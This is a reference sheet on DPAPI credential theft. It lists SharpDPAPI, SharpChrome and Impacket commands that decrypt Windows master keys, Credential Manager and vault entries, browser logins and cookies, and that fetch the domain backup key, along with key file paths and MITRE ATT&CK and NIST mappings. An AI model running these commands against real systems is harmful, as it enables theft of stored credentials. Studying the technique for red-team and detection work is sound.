# Abusing Dpapi For Credential Access

## API Reference

## SharpDPAPI User Commands

| Command | Purpose | Example |
|---------|---------|---------|
| `triage` | Auto-run credentials, vaults, rdg, certificates | `SharpDPAPI.exe triage /unprotect` |
| `masterkeys` | Decrypt user master keys (GUID:SHA1 output) | `SharpDPAPI.exe masterkeys /password:Pass` |
| `credentials` | Decrypt Credential Manager blobs | `SharpDPAPI.exe credentials /pvk:key.pvk` |
| `vaults` | Decrypt Credential Vault entries | `SharpDPAPI.exe vaults /pvk:key.pvk` |
| `rdg` | Decrypt RDCMan.settings RDP passwords | `SharpDPAPI.exe rdg /unprotect` |
| `keepass` | Decrypt KeePass DPAPI keys | `SharpDPAPI.exe keepass /unprotect` |
| `certificates` | Decrypt certificate private keys | `SharpDPAPI.exe certificates /unprotect /showall` |

## SharpDPAPI Machine Commands (require admin/SYSTEM)

| Command | Purpose |
|---------|---------|
| `machinemasterkeys` | Decrypt machine master keys (uses DPAPI_SYSTEM LSA secret) |
| `machinecredentials` | Decrypt machine credential blobs |
| `machinevaults` | Decrypt machine vault entries |
| `machinetriage` | Run all machine-scoped triage commands |

## SharpDPAPI Supporting Commands

| Command | Purpose | Example |
|---------|---------|---------|
| `backupkey` | Retrieve domain DPAPI backup key (.pvk) via MS-BKRP | `SharpDPAPI.exe backupkey /server:dc01 /file:key.pvk` |

## Common Flags

| Flag | Meaning |
|------|---------|
| `/unprotect` | Use live `CryptUnprotectData` in current user context (online) |
| `/password:<pw>` | Decrypt master keys with the user's plaintext password |
| `/ntlm:<hash>` | Decrypt master keys with the user's NTLM hash |
| `/pvk:<file>` | Use domain backup private key for decryption |
| `/mkfile:<file>` | Provide a specific master key file |
| `/server:<dc>` | Target DC for backupkey retrieval |
| `/target:<path>` | Target file/folder to decrypt |
| `/rpc` | Use RPC to request master key decryption from a DC |
| `/showall` | Show all certificate stores / verbose output |

## SharpChrome Commands

| Command | Purpose | Example |
|---------|---------|---------|
| `logins` | Decrypt saved browser logins | `SharpChrome.exe logins /unprotect` |
| `cookies` | Decrypt browser cookies | `SharpChrome.exe cookies /pvk:key.pvk` |
| `statekeys` | Decrypt the AES app-bound state key | `SharpChrome.exe statekeys /unprotect` |

## Impacket dpapi.py (Linux)

| Subcommand | Purpose | Example |
|------------|---------|---------|
| `masterkey` | Decrypt a master key file | `impacket-dpapi masterkey -file MK -pvk key.pvk` |
| `credential` | Decrypt a credential blob | `impacket-dpapi credential -file CRED -key 0x<mk>` |
| `vault` | Decrypt vault policy/creds | `impacket-dpapi vault -vpol VPOL -vcrd VCRD -key 0x<mk>` |
| `backupkeys` | Retrieve domain backup keys | `impacket-dpapi backupkeys -t corp.local/admin@dc -pvk out.pvk` |

## Key File Locations

| Path | Contents |
|------|----------|
| `%APPDATA%\Microsoft\Protect\<SID>\` | User master keys |
| `%WINDIR%\System32\Microsoft\Protect\` | Machine master keys |
| `%LOCALAPPDATA%\Microsoft\Credentials\` | Credential Manager blobs |
| `%APPDATA%\Microsoft\Vault\` / `%LOCALAPPDATA%\Microsoft\Vault\` | Credential Vault |

## External References

- SharpDPAPI README: https://github.com/GhostPack/SharpDPAPI
- Impacket: https://github.com/fortra/impacket

---

## Standards and Controls

## NIST CSF 2.0

| ID | Name | Rationale |
|----|------|-----------|
| DE.CM-01 | Networks and network services are monitored to find potentially adverse events | DPAPI abuse generates detectable signals (MS-BKRP backup-key RPC to the DC, Protect/Credentials folder access, LSASS access) that monitoring must surface. |

## MITRE ATT&CK

| Technique ID | Name | Tactic | Rationale |
|--------------|------|--------|-----------|
| T1555.004 | Credentials from Password Stores: Windows Credential Manager | Credential Access | DPAPI protects Credential Manager/Vault entries; decrypting them recovers stored credentials. |
| T1555.003 | Credentials from Password Stores: Credentials from Web Browsers | Credential Access | SharpChrome decrypts DPAPI-protected browser logins/cookies. |
| T1003 | OS Credential Dumping | Credential Access | Extracting master keys and the domain backup key dumps credential material. |

## Supporting Frameworks and Standards

- **MS-BKRP** — BackupKey Remote Protocol; the RPC interface used to retrieve the domain DPAPI backup key.
- **MS-DPSP / DPAPI** — Microsoft's Data Protection API specification governing master keys and blob protection.
- **D3FEND** — Credential Eviction / Password Rotation as mitigations after DPAPI compromise.

## Official Resources

- SharpDPAPI / SharpChrome: https://github.com/GhostPack/SharpDPAPI
- Mimikatz: https://github.com/gentilkiwi/mimikatz
- Impacket: https://github.com/fortra/impacket
- DonPAPI: https://github.com/login-securite/DonPAPI
- HackTricks DPAPI: https://book.hacktricks.wiki/en/windows-hardening/windows-local-privilege-escalation/dpapi-extracting-passwords.html
- SpecterOps "Operational Guidance for Offensive User DPAPI Abuse": https://posts.specterops.io/operational-guidance-for-offensive-user-dpapi-abuse-1fb7fac8b107
